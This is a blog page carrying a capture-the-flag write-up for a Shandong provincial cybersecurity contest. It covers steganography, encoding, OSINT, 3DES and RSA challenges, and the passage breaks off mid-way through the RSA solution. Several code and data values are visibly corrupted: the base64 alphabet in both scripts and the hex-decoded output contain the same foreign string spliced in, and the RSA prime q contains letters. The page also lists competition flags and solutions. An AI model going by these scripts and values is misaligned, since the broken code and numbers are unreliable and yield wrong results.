@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+
+<html lang="cn">
+
+<head>
+    
+    <title>山东省&#34;技能兴鲁-网络安全赛道&#34;职业技能大赛WriteUp - RunCtf</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="images/logo.png" type="image/png" />
+    <meta name="description" content="miscmisc_pyc用uncompyle6反编译 1234567891011121314151617181920212223242526272829303132333435363738import base64flag_2 &#x3D; &amp;#x27;*****&amp;#x27;bin_str &#x3D; &amp;#x27;&amp;#x27;.join([bin(ord(c)).replace(&amp;#x27;0b&amp;#x27;, &amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="山东省&quot;技能兴鲁-网络安全赛道&quot;职业技能大赛WriteUp">
+<meta property="og:url" content="http://runctf.cn/2022/12/23/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/index.html">
+<meta property="og:site_name" content="RunCtf">
+<meta property="og:description" content="miscmisc_pyc用uncompyle6反编译 1234567891011121314151617181920212223242526272829303132333435363738import base64flag_2 &#x3D; &amp;#x27;*****&amp;#x27;bin_str &#x3D; &amp;#x27;&amp;#x27;.join([bin(ord(c)).replace(&amp;#x27;0b&amp;#x27;, &amp;#">
+<meta property="og:locale">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/HY8Njk7u4fRlWMnpqsx2ndhRicSeaPaOu3m6HiaVnzPsGe6oM73gPSsM5s19fbWZVZyVjXSlnxo3nHiade9wc5Qqw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56da3a0e26.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56ddbd3187.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56de95c053.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56e0b308c7.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56e5171f45.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56ebfc151d.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56ecf346ce.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56ee978df2.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56eff4767d.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56f0916cc3.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56f1e3c9d3.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/23/63a56f26df569.png">
+<meta property="article:published_time" content="2022-12-23T14:16:01.000Z">
+<meta property="article:modified_time" content="2023-01-11T16:35:33.800Z">
+<meta property="article:author" content="JunHou">
+<meta property="article:tag" content="技术">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mmbiz.qpic.cn/mmbiz_png/HY8Njk7u4fRlWMnpqsx2ndhRicSeaPaOu3m6HiaVnzPsGe6oM73gPSsM5s19fbWZVZyVjXSlnxo3nHiade9wc5Qqw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1673454978692">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1673454978692">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1673454978692">
+        
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://tenapi.cn/acg/?100)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="JunHou" class="mdui-btn mdui-btn-icon"><img src="https://www.luminesight.com/cdn/Server/TouXiang.jpg" alt="JunHou"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="JunHou">
+            <img src="https://www.luminesight.com/cdn/Server/TouXiang.jpg" alt="JunHou" alt="JunHou">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>13</div>
+        <div><span>Tags</span>5</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY/index.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/donate" title="给我赞助">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                给我赞助
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="Search" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1673454978693"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://jq.qq.com"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ群'}"
+			style="
+				color: rgb(249, 174, 8);
+				background-color: rgba(249, 174, 8, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/289146211"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/server2565543706"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://www.zhihu.com/people/dcncloud"
+			target="_blank"
+			mdui-tooltip="{content: '知乎'}"
+			style="
+				color: rgb(30, 136, 229);
+				background-color: rgba(30, 136, 229, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-zhihu"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://twitter.com/"
+			target="_blank"
+			mdui-tooltip="{content: 'Twitter'}"
+			style="
+				color: rgb(59, 151, 239);
+				background-color: rgba(59, 151, 239, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-twitter"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/%E6%8A%80%E6%9C%AF/" style="font-size: 20px;">技术</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%B8%B8%E6%88%8F/" style="font-size: 10px;">游戏</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(5);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        <!-- 一言 -->
+<div class="nexmoe-widget-wrap">
+  <h3 class="nexmoe-widget-title">
+    Hitokoto
+  </h3>
+  <div class="nexmoe-widget">
+    <ul class="hitokoto-box">
+      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
+        <a href="#" id="hitokoto_text">
+          
+        </a>
+        <a href="#" id="hitokoto_error_text" style="display: none;">
+          
+        </a>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<script>
+  let hitokotoText = document.getElementById('hitokoto_text')
+  let hitokotoErroText = document.getElementById('hitokoto_error_text')
+  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
+  window.onload = function () {
+    let url = 'https://v1.hitokoto.cn'
+    if (hitokotoCategory) {
+      url += '?c=' + hitokotoCategory
+    }
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
+        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      })
+      .catch((reason) => {
+        console.error(11, reason)
+        hitokotoText.style.display = 'none'
+        hitokotoErroText.style.display = 'block'
+      })
+  }
+</script>
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">13</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/12/23/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/">山东省&#34;技能兴鲁-网络安全赛道&#34;职业技能大赛WriteUp</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/15/%E5%8E%9F%E7%A5%9E%E6%9C%8D%E5%8A%A1%E5%8C%BA%E8%BD%AC%E6%8D%A2/">原神换服</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/11/CTFd/">部署CTFd</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/11/w1r3s-editable/">w1r3s-editable解题笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/10/%E7%AC%94%E8%AE%B0/">Pwn的学习笔记</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 JunHou
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">	鲁ICP备2022032031-1号</a>
+        <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn@latest/js/hititle.js"></script>
+    </div>
+</div><!-- .nexmoe-drawer -->
+
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="https://tenapi.cn/acg/?19" alt="山东省&#34;技能兴鲁-网络安全赛道&#34;职业技能大赛WriteUp" loading="lazy">
+            <h1>山东省&#34;技能兴鲁-网络安全赛道&#34;职业技能大赛WriteUp</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2022年12月23日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc-pyc"><a href="#misc-pyc" class="headerlink" title="misc_pyc"></a>misc_pyc</h3><p>用uncompyle6反编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">flag_2 = &#x27;*****&#x27;</span><br><span class="line">bin_str = &#x27;&#x27;.join([bin(ord(c)).replace(&#x27;0b&#x27;, &#x27;&#x27;).zfill(8) for c in flag_2])</span><br><span class="line">base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTKipLNneNhQLR8xeL8rP12aDox5DmYSrcB3456789+/&#x27;</span><br><span class="line">with open(&#x27;0.txt&#x27;, &#x27;rb&#x27;) as (f0):</span><br><span class="line">    with open(&#x27;1.txt&#x27;, &#x27;wb&#x27;) as (f1):</span><br><span class="line">        for line in f0.readlines():</span><br><span class="line">            rowstr = base64.b64encode(line.replace(b&#x27;\n&#x27;, b&#x27;&#x27;))</span><br><span class="line">            equalnum = rowstr.count(b&#x27;=&#x27;)</span><br><span class="line">            if equalnum:</span><br><span class="line">                if len(bin_str):</span><br><span class="line">                    offset = int(&#x27;0b&#x27; + bin_str[:equalnum * 2], 2)</span><br><span class="line">                    char = rowstr[(len(rowstr) - equalnum - 1)]</span><br><span class="line">                    char = chr(char)</span><br><span class="line">                    rowstr = rowstr.replace(char.encode(), base64chars[(base64chars.index(char) + offset)].encode())</span><br><span class="line">                    bin_str = bin_str[equalnum * 2:]</span><br><span class="line">            f1.write(rowstr + b&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">what_f1_write = [</span><br><span class="line"> &#x27;YQ1=&#x27;,</span><br><span class="line"> &#x27;Yg3=&#x27;,</span><br><span class="line"> &#x27;Yw0=&#x27;,</span><br><span class="line"> &#x27;ZA3=&#x27;,</span><br><span class="line"> &#x27;ZQ1=&#x27;,</span><br><span class="line"> &#x27;Zg0=&#x27;,</span><br><span class="line"> &#x27;Zw1=&#x27;,</span><br><span class="line"> &#x27;aA1=&#x27;,</span><br><span class="line"> &#x27;aQ0=&#x27;,</span><br><span class="line"> &#x27;ag3=&#x27;,</span><br><span class="line"> &#x27;aw1=&#x27;,</span><br><span class="line"> &#x27;bA2=&#x27;,</span><br><span class="line"> &#x27;bQ0=&#x27;,</span><br><span class="line"> &#x27;bg3=&#x27;,</span><br><span class="line"> &#x27;bw1=&#x27;,</span><br><span class="line"> &#x27;cA0=&#x27;,</span><br><span class="line"> &#x27;cQ1=&#x27;,</span><br><span class="line"> &#x27;cg3=&#x27;,</span><br><span class="line"> &#x27;c9==&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p>base64隐写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTKipLNneNhQLR8xeL8rP12aDox5DmYSrcB3456789+/&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">what_f1_write = [&#x27;YQ1=&#x27;,&#x27;Yg3=&#x27;,&#x27;Yw0=&#x27;,&#x27;ZA3=&#x27;,&#x27;ZQ1=&#x27;,&#x27;Zg0=&#x27;,&#x27;Zw1=&#x27;,&#x27;aA1=&#x27;,&#x27;aQ0=&#x27;,&#x27;ag3=&#x27;,</span><br><span class="line">&#x27;aw1=&#x27;,&#x27;bA2=&#x27;,&#x27;bQ0=&#x27;,&#x27;bg3=&#x27;,&#x27;bw1=&#x27;,&#x27;cA0=&#x27;,&#x27;cQ1=&#x27;,&#x27;cg3=&#x27;,&#x27;c9==&#x27;]</span><br><span class="line"></span><br><span class="line">bin_str = &#x27;&#x27;</span><br><span class="line">for stegb64 in what_f1_write:</span><br><span class="line">    # stegb64 = str(line, &quot;utf-8&quot;).strip(&quot;\n&quot;)</span><br><span class="line">    rowb64 = str(base64.b64encode(base64.b64decode(stegb64)), &quot;utf-8&quot;).strip(&quot;\n&quot;)</span><br><span class="line">    offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;, &#x27;&#x27;).replace(&#x27;\r&#x27;,&#x27;&#x27;)[-1]) - b64chars.index(rowb64.replace(&#x27;=&#x27;, &#x27;&#x27;)[-1]))</span><br><span class="line">    equalnum = stegb64.count(&#x27;=&#x27;)  # no equalnum no offset</span><br><span class="line">    if equalnum:</span><br><span class="line">        bin_str += bin(offset)[2:].zfill(equalnum * 2)</span><br><span class="line">    print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in range(0, len(bin_str), 8)]))</span><br></pre></td></tr></table></figure>
+
+<p>得到结果 sE64}</p>
+<p>再去用pyc隐写解前半段</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://mmbiz.qpic.cn/mmbiz_png/HY8Njk7u4fRlWMnpqsx2ndhRicSeaPaOu3m6HiaVnzPsGe6oM73gPSsM5s19fbWZVZyVjXSlnxo3nHiade9wc5Qqw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" data-caption="图片" loading="lazy"></p>
+<p>拼起来得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;pyc&amp;bAsE64&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="好玩的编码"><a href="#好玩的编码" class="headerlink" title="好玩的编码"></a>好玩的编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5230307a5631465756444a4e576c6c4852566c4d4d6b3953535555794d30745454454a4a52454e54576c704a556b5a584e6b355454453431574668425430784b546c704a555430395054303d</span><br></pre></td></tr></table></figure>
+
+<p>解hex16：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R00zV1FWVDJNWllHRVlMMk9SSUUyM0tTKipLNneNhQLR8xeL8rP12aDox5DmYSrcBDmYSrcB</span><br></pre></td></tr></table></figure>
+
+<p>magic：base32再58：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;W0w_You_ar3_great&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="happyImg"><a href="#happyImg" class="headerlink" title="happyImg"></a>happyImg</h3><p>stegsolve左右翻发现一个密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!QAZXSW@1qazxsw2</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56da3a0e26.png" alt="image-20221223165810295" data-caption="image-20221223165810295" loading="lazy"></p>
+<p>lsb隐写,red，blue为0。</p>
+<p>保存为bin，记事本打开看到flag.png，改名为压缩包，输入密码，得到flag</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56ddbd3187.png" alt="image-20221223165906521" data-caption="image-20221223165906521" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56de95c053.png" alt="image-20221223165920078" data-caption="image-20221223165920078" loading="lazy"></p>
+<h3 id="网络寻综"><a href="#网络寻综" class="headerlink" title="网络寻综"></a>网络寻综</h3><p>看图是哈穆迪清真寺</p>
+<p>谷歌搜mosquee AI-Hamoudi phone</p>
+<p>看到电话</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56e0b308c7.png" alt="image-20221223165953829" data-caption="image-20221223165953829" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;+25377865774&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="3des"><a href="#3des" class="headerlink" title="3des"></a>3des</h3><p>给了一个java文件和一个加密结果</p>
+<p>算法就是tripleDES</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import javax.crypto.Cipher;</span><br><span class="line">import javax.crypto.spec.IvParameterSpec;</span><br><span class="line">import javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line">class Crypto &#123;</span><br><span class="line"></span><br><span class="line">    private static String KEY = &quot;@2AzsQ#Hnx%XTosMR6$LtEKD&quot;;</span><br><span class="line">    private static String IV = &quot;CpEF7SDz&quot;;</span><br><span class="line"></span><br><span class="line">    public static String encrypt(String data) throws Exception &#123;</span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;DESede/CBC/PKCS5Padding&quot;);</span><br><span class="line">        SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(), &quot;DESede&quot;);</span><br><span class="line">        IvParameterSpec ivParameterSpec = new IvParameterSpec(IV.getBytes());</span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivParameterSpec);</span><br><span class="line">        byte[] encrypted = cipher.doFinal(data.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">        return bytes2hexstr(encrypted);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String bytes2hexstr(byte[] buf) &#123;</span><br><span class="line">        StringBuffer sb = new StringBuffer();</span><br><span class="line">        for (int i = 0; i &lt; buf.length; i++) &#123;</span><br><span class="line">            String hex = Integer.toHexString(buf[i] &amp; 0xFF);</span><br><span class="line">            if (hex.length() == 1) &#123;</span><br><span class="line">                hex = &#x27;0&#x27; + hex;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(hex.toLowerCase());</span><br><span class="line">        &#125;</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(encrypt(&quot;flag&#123;xxx&#125;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>key&#x3D;@2AzsQ#Hnx%XTosMR6$LtEKD</p>
+<p>IV&#x3D;CpEF7SDz</p>
+<p>算法CBC&#x2F;PKCS5Padding</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56e5171f45.png" alt="image-20221223170104150" data-caption="image-20221223170104150" loading="lazy"></p>
+<h3 id="happyRSA"><a href="#happyRSA" class="headerlink" title="happyRSA"></a>happyRSA</h3><p>给了pqenc</p>
+<p>但是e是phi_n的因数</p>
+<p>用AMM在有限域内开方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">#sage</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">p = 97559992143538505823351615639211763734311559951587665014345919747733390740450790273359386575890798160795025626573580365828156108078100621074495137190416226109270591884516099679926053478560750986193065549865131400457769381398338702594631516054868885157801055786648957386508374821243393633398068286519087291899</span><br><span class="line">e = 223</span><br><span class="line">q = 39f36dNMc5CmshUCPAH1VsCv4A84pGdSyu61654473174790323208128426716523786159389593732096324499033892465876683490515456465981922248571768795221792067055550876465089846480000103207743072486330333647531692833975457277965585913100536970416049033758578728704151353769882703817603346904165274693820583811661679269246933</span><br><span class="line">c = 